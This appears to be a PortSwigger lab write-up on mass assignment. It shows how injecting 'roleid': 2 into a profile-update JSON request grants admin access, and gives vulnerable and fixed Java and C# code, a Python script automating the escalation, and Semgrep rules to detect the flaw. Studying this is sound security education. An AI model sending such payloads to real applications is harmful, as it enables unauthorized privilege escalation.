---
title: "Lab 04: User role can be modified in user profile"
date: 2025-12-16
categories: [portswigger, access_control]
tags: [mass assignment] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-16-lab04_access_control/
---

## 1. Executive Summary

**Vulnerability:** Mass Assignment (also known as Over-Posting).**Description:** The application framework automatically binds (maps) incoming JSON data to internal object fields. Because the developer did not explicitly restrict which fields can be updated, an attacker can inject sensitive fields—like `roleid`—that were not intended to be exposed in the "Update Profile" form.

## 2. The Attack

**Objective:** Escalate privileges to Admin and delete `carlos`.

1. **Reconnaissance:** I logged in with the provided credentials (`wiener`/`peter`) and navigated to the "My Account" page. I updated my email address to generate a `POST` request.
2. **Interception:** I captured the request in Burp Suite. The body was a JSON object:
    
    ```jsx
    {
      "email": "wiener@normal-user.net"
    }
    ```
    
    However, the **response** JSON revealed an interesting field:
    
    ```jsx
    {
      "username": "wiener",
      "email": "wiener@normal-user.net",
      "roleid": 1
    }
    ```
    
3. **Exploitation:** I sent the request to **Repeater**. I suspected that since the server sends `roleid` back, it might also *accept* it as input. I modified the JSON payload to include the field, guessing that `2` might be the Admin ID (since `1` was user):
    
    ```jsx
    {
      "email": "hacker@test.com",
      "roleid": 2
    }
    ```
    
    ![image.png](image.png)
    
4. **Result:** The server responded with the updated object showing `"roleid": 2`.
5. **Action:** I navigated to `/admin` (which was previously forbidden), successfully accessed the dashboard, and deleted `carlos`.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
Modern frameworks (Spring Boot, ASP.NET Core, Rails) love "Magic." They try to make life easy by automatically matching JSON keys to Class properties.

- **The Flaw:** The developer used the main **Database Entity** (which contains `password`, `roleid`, `balance`) as the input object for the API endpoint.
- **The Reality:** Even though the frontend form only sends `email`, the malicious user can send `roleid`. The framework sees the `roleid` field in the class, sees the data in the JSON, and blindly updates it.

### Java (Spring Boot)

```java
@RestController
public class ProfileController {

    @Autowired
    private UserRepository userRepository;

    // VULNERABLE: The method accepts the raw 'User' entity.
    // The 'User' class likely contains 'roleId', 'password', etc.
    // Spring will map ANY matching field from the JSON to this object.
    @PostMapping("/my-account/change-email")
    public User updateProfile(@RequestBody User updatedUser, HttpSession session) {
        User currentUser = userRepository.findBySession(session);
        
        // DANGEROUS: Some frameworks merge these automatically, 
        // or the developer copies fields blindly.
        currentUser.setEmail(updatedUser.getEmail());
        
        // If the framework did the binding on 'currentUser' directly, 
        // or if a merger tool was used, roleId is now overwritten.
        return userRepository.save(currentUser);
    }
}
```

### C# (ASP.NET Core)

```csharp
[ApiController]
[Route("api/profile")]
public class ProfileController : ControllerBase
{
    // VULNERABLE: Accepting the 'User' Entity directly from the body.
    // Attackers can fill any public property of the User class.
    [HttpPost("update")]
    public IActionResult UpdateProfile([FromBody] User userUpdates)
    {
        var currentUser = _userService.GetCurrentUser();

        // If the code uses a library like AutoMapper without configuration,
        // or simply blindly saves 'userUpdates', the RoleId changes.
        currentUser.Email = userUpdates.Email;
        currentUser.RoleId = userUpdates.RoleId; // Implicitly bound!

        _dbContext.SaveChanges();
        return Ok(currentUser);
    }
}
```

### Mock PR Comment

I noticed that the `updateProfile` endpoint accepts the full `User` entity as a request body. This enables "Mass Assignment," allowing users to potentially overwrite sensitive fields like `roleId` or `balance` if they include them in the JSON payload.

Please introduce a **DTO (Data Transfer Object)** (e.g., `UpdateEmailRequest`) that contains *only* the fields we want to allow users to change (just `email`), and map that DTO to the entity manually.

## 4. The Fix

**Explanation of the Fix:**
We must never trust the client to send only the data we expect. We should create a separate class (often called a **DTO** - Data Transfer Object, or a **ViewModel**) that defines exactly what can be updated.

### Secure Java (Using DTO)

```csharp
// 1. Create a specific class for this action
public class EmailUpdateDTO {
    // Only email is here. No roleId.
    private String email; 
    
    // getters and setters
}

@PostMapping("/my-account/change-email")
public User updateProfile(@RequestBody EmailUpdateDTO request, HttpSession session) {
    User user = userRepository.findBySession(session);
    
    // SECURE: We only pull data from the restricted DTO.
    // Even if they send 'roleid', it is ignored because the DTO doesn't have that field.
    user.setEmail(request.getEmail());
    
    return userRepository.save(user);
}
```

### Secure C# (Using ViewModel)

```csharp
// 1. Define the restricted model
public class UpdateProfileRequest 
{
    public string Email { get; set; }
    // RoleId is NOT here.
}

[HttpPost("update")]
public IActionResult UpdateProfile([FromBody] UpdateProfileRequest request)
{
    var user = _userService.GetCurrentUser();

    // SECURE: Manually updating only allowed fields.
    user.Email = request.Email;

    _dbContext.SaveChanges();
    return Ok(user);
}
```

## 5. Automation

*A Python script that attempts to escalate privileges by injecting the `roleid` parameter.*

```python
import requests
import json

def exploit_mass_assignment(url, session_cookie):
	target_url = f"{url}/my-account/change-email"
	
	cookies = {'session': session_cookie}
	
	payload = {
		"email": "kh4n@mail.com",
		"roleid": 2
	}
	
	print(f"[*] Sending Mass Assignment payload to {target_url}...")
	
	response = requests.post(target_url, json=payload, cookies=cookies)
	
	print(f"[*] Response Code: {response.status_code}")
	print(f"[*] Response Body: {response.text}")
	
	#check if the server reflected the roleid change
	if '"roleid":2' in response.text:
		print("[!!!] SUCCESS: Role ID changed to 2. Admin access acquired")
		
		# verify admin access
		admin_check = requests.get(f"{url}/admin", cookies=cookies)
		if admin_check.status_code == 200:
			print("[+] Confirmed: Access to /admin granted.")
	else:
		print("[-] Exploit failed. Role ID not updated")
		
		
#usage
exploit_mass_assignment("https://YOUR-LAB.web-security-academy.net", "YOUR_SESSION_STRING")
```

## 6. Static Analysis (Semgrep)

*A rule to detect when Controllers use full Entity classes as input arguments instead of DTOs/Requests.*

The Logic

We want to flag any method in a Controller (indicated by `@RestController` or `@Controller`) that accepts an argument annotated with `@RequestBody` where the type is a known Entity or Domain class (like `User`, `Account`). *Note: In a real environment, you would customize the `pattern-not` or allow-lists to exclude classes ending in `DTO` or `Request`.*

**The Rule** (`rules.yaml`)

### Java Rule

```yaml
rules:
  - id: java-mass-assignment-risk
    languages: [java]
    message: |
      Potential Mass Assignment vulnerability. 
      The Controller is accepting a raw Entity/Object as input. 
      Ensure you are using a DTO (Data Transfer Object) to whitelist allowed fields.
    severity: WARNING
    patterns:
      # 1. Inside a class annotated as a Controller
      - pattern-inside: |
          @$CONTROLLER
          class $CLASS { ... }
      - metavariable-regex:
          metavariable: $CONTROLLER
          regex: (RestController|Controller)
      
      # 2. Look for methods using @RequestBody
      - pattern: |
          public $RET $METHOD(..., @RequestBody $TYPE $ARG, ...) { ... }
      
      # 3. Filter: Warn if the Type does NOT end in DTO, Request, or Model
      # (This assumes a naming convention is used. If not, this finds everything)
      - metavariable-regex:
          metavariable: $TYPE
          regex: ^(?!.*(DTO|Request|Form|Body)).*$
```

### **C# Rule**

```yaml
rules:
  - id: csharp-mass-assignment-risk
    languages: [csharp]
    message: "Avoid using raw Entities in Controller actions (Mass Assignment risk). Use ViewModels/DTOs."
    severity: WARNING
    patterns:
      - pattern-inside: |
          public class $CONTROLLER : Controller { ... }
      - pattern: |
          public IActionResult $METHOD(..., [FromBody] $TYPE $ARG, ...) { ... }
      # Flag if the input type is likely an Entity (e.g. User, Order) rather than a Request model
      - metavariable-regex:
          metavariable: $TYPE
          regex: ^(User|Account|Order|Product)$
```
